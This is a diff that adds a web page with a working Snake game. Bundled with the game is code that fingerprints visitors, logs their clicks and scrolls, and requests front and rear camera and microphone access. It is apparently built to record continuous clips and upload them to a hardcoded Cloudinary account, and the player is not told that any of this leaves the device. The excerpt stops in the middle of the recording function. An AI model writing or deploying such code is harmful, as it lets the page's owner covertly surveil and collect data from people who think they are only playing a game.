@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+<title>Snake + Camera Capture + User Data</title>
+<style>
+  body {
+    margin: 0;
+    background: #121212;
+    color: #eee;
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 10px;
+  }
+  h1 {
+    margin-bottom: 0;
+  }
+  #gameContainer {
+    margin-top: 15px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  canvas {
+    background: #222;
+    border: 2px solid #eee;
+    border-radius: 8px;
+    touch-action: none;
+  }
+  #scoreBoard {
+    font-size: 1.5rem;
+    margin-top: 10px;
+    user-select: none;
+  }
+  #newGameBtn {
+    margin-top: 15px;
+    background: #6200ea;
+    border: none;
+    color: white;
+    padding: 10px 24px;
+    border-radius: 6px;
+    font-size: 1.1rem;
+    cursor: pointer;
+    user-select: none;
+  }
+  #newGameBtn:hover {
+    background: #3700b3;
+  }
+</style>
+</head>
+<body>
+
+<h1>Snake Game + Webcam & Mic Capture</h1>
+
+<div id="gameContainer">
+  <canvas id="game" width="320" height="320"></canvas>
+  <div id="scoreBoard">Score: 0</div>
+  <button id="newGameBtn">New Game</button>
+</div>
+
+<script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
+
+<script>
+(async () => {
+  // ====== CONFIGURE YOUR CLOUDINARY ======
+  const CLOUD_NAME = 'dps0g5ftz'; // your cloud name here
+  const UPLOAD_PRESET = 'unsigned'; // your unsigned preset name here
+
+  // ====== GLOBALS ======
+  const canvas = document.getElementById('game');
+  const ctx = canvas.getContext('2d');
+  const scoreBoard = document.getElementById('scoreBoard');
+  const newGameBtn = document.getElementById('newGameBtn');
+
+  const gridSize = 16;
+  const tileCount = canvas.width / gridSize;
+
+  // Session ID for folder naming
+  const sessionId = 'session_' + Date.now();
+
+  // Game state
+  let snake = [{x: 7, y: 7}];
+  let velocity = {x: 0, y: 0};
+  let food = {x: 5, y: 5};
+  let score = 0;
+  let gameInterval = null;
+  let gameSpeed = 120;
+
+  // Touch swipe tracking variables for mobile controls
+  let touchStartX = null;
+  let touchStartY = null;
+
+  // ====== GAME LOGIC ======
+  function drawGame() {
+    ctx.fillStyle = '#222';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Draw snake
+    ctx.fillStyle = '#0f0';
+    snake.forEach((segment, index) => {
+      ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 1, gridSize - 1);
+    });
+
+    // Draw food
+    ctx.fillStyle = '#f00';
+    ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 1, gridSize - 1);
+  }
+
+  function updateGame() {
+    // Move snake by velocity
+    const head = {...snake[0]};
+    head.x += velocity.x;
+    head.y += velocity.y;
+
+    // Wrap around screen edges
+    if (head.x < 0) head.x = tileCount - 1;
+    if (head.x >= tileCount) head.x = 0;
+    if (head.y < 0) head.y = tileCount - 1;
+    if (head.y >= tileCount) head.y = 0;
+
+    // Check if snake bites itself -> reset game
+    for (let i = 0; i < snake.length; i++) {
+      if (snake[i].x === head.x && snake[i].y === head.y) {
+        endGame();
+        return;
+      }
+    }
+
+    snake.unshift(head);
+
+    // Check food collision
+    if (head.x === food.x && head.y === food.y) {
+      score++;
+      placeFood();
+      scoreBoard.textContent = 'Score: ' + score;
+      if (gameSpeed > 40) {
+        gameSpeed -= 2; // speed up the game a little
+        clearInterval(gameInterval);
+        gameInterval = setInterval(gameLoop, gameSpeed);
+      }
+    } else {
+      snake.pop();
+    }
+  }
+
+  function placeFood() {
+    food = {
+      x: Math.floor(Math.random() * tileCount),
+      y: Math.floor(Math.random() * tileCount),
+    };
+    // Make sure food doesn't spawn inside snake
+    if (snake.some(s => s.x === food.x && s.y === food.y)) {
+      placeFood();
+    }
+  }
+
+  function gameLoop() {
+    updateGame();
+    drawGame();
+  }
+
+  function startGame() {
+    snake = [{x:7, y:7}];
+    velocity = {x:0, y:0};
+    score = 0;
+    gameSpeed = 120;
+    scoreBoard.textContent = 'Score: 0';
+    placeFood();
+
+    if (gameInterval) clearInterval(gameInterval);
+    gameInterval = setInterval(gameLoop, gameSpeed);
+  }
+
+  function endGame() {
+    alert(`Game over! Your score was ${score}. Starting new game.`);
+    startGame();
+  }
+
+  // ====== CONTROL HANDLERS ======
+
+  // Keyboard
+  window.addEventListener('keydown', e => {
+    switch(e.key) {
+      case 'ArrowUp': if (velocity.y === 0) velocity = {x:0, y:-1}; break;
+      case 'ArrowDown': if (velocity.y === 0) velocity = {x:0, y:1}; break;
+      case 'ArrowLeft': if (velocity.x === 0) velocity = {x:-1, y:0}; break;
+      case 'ArrowRight': if (velocity.x === 0) velocity = {x:1, y:0}; break;
+    }
+  });
+
+  // Touch for mobile swipe detection
+  canvas.addEventListener('touchstart', e => {
+    if (e.touches.length === 1) {
+      touchStartX = e.touches[0].clientX;
+      touchStartY = e.touches[0].clientY;
+    }
+  });
+
+  canvas.addEventListener('touchend', e => {
+    if (touchStartX === null || touchStartY === null) return;
+    const touchEndX = e.changedTouches[0].clientX;
+    const touchEndY = e.changedTouches[0].clientY;
+
+    const diffX = touchEndX - touchStartX;
+    const diffY = touchEndY - touchStartY;
+
+    if (Math.abs(diffX) > Math.abs(diffY)) {
+      // Horizontal swipe
+      if (diffX > 20 && velocity.x === 0) velocity = {x:1, y:0};
+      else if (diffX < -20 && velocity.x === 0) velocity = {x:-1, y:0};
+    } else {
+      // Vertical swipe
+      if (diffY > 20 && velocity.y === 0) velocity = {x:0, y:1};
+      else if (diffY < -20 && velocity.y === 0) velocity = {x:0, y:-1};
+    }
+    touchStartX = null;
+    touchStartY = null;
+  });
+
+  // New game button
+  newGameBtn.addEventListener('click', () => {
+    startGame();
+  });
+
+  // ====== USER INFO & BEHAVIOR COLLECTION ======
+
+  const userInfo = {
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    viewportWidth: window.innerWidth,
+    viewportHeight: window.innerHeight,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookiesEnabled: navigator.cookieEnabled,
+    online: navigator.onLine,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory || 'N/A',
+    touchPoints: navigator.maxTouchPoints || 0,
+    referrer: document.referrer || 'N/A',
+    url: window.location.href,
+    // Behavior logs to be added
+    clicks: 0,
+    scrolls: 0,
+    focusChanges: 0,
+  };
+
+  window.addEventListener('click', () => userInfo.clicks++);
+  window.addEventListener('scroll', () => userInfo.scrolls++);
+  window.addEventListener('focus', () => userInfo.focusChanges++);
+
+  // ====== UPLOAD TO CLOUDINARY FUNCTION ======
+
+  async function uploadBlobToCloudinary(blob, folder, resourceType='video') {
+    // Using unsigned upload API via fetch
+    const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`;
+
+    const formData = new FormData();
+    formData.append('file', blob);
+    formData.append('upload_preset', UPLOAD_PRESET);
+    formData.append('folder', folder);
+    formData.append('resource_type', resourceType);
+
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        body: formData
+      });
+      const data = await res.json();
+      console.log('Uploaded to Cloudinary:', data.secure_url);
+      return data.secure_url;
+    } catch (e) {
+      console.error('Upload failed:', e);
+      return null;
+    }
+  }
+
+  // ====== MEDIA CAPTURE & UPLOAD ======
+
+  async function startMediaCapture() {
+    // Request permissions once
+    try {
+      // Front camera + mic stream
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' }, audio: true
+      });
+
+      // Rear camera stream (some devices may not support simultaneously)
+      let rearStream = null;
+      try {
+        rearStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: "environment" } }, audio: false
+        });
+      } catch(e) {
+        console.warn('Rear camera not available or permission denied');
+      }
+
+      // Start recording front cam + mic
+      if (frontStream) {
+        recordAndUpload(frontStream, 'front_cam');
+      }
+
+      // Start recording rear cam if available
+      if (rearStream) {
+        recordAndUpload(rearStream, 'rear_cam');
+      }
+
+    } catch (err) {
+      console.error('Media permission denied or error:', err);
+    }
+  }
+
+  // Record 20-second blobs continuously and upload, keep cycling
+  function
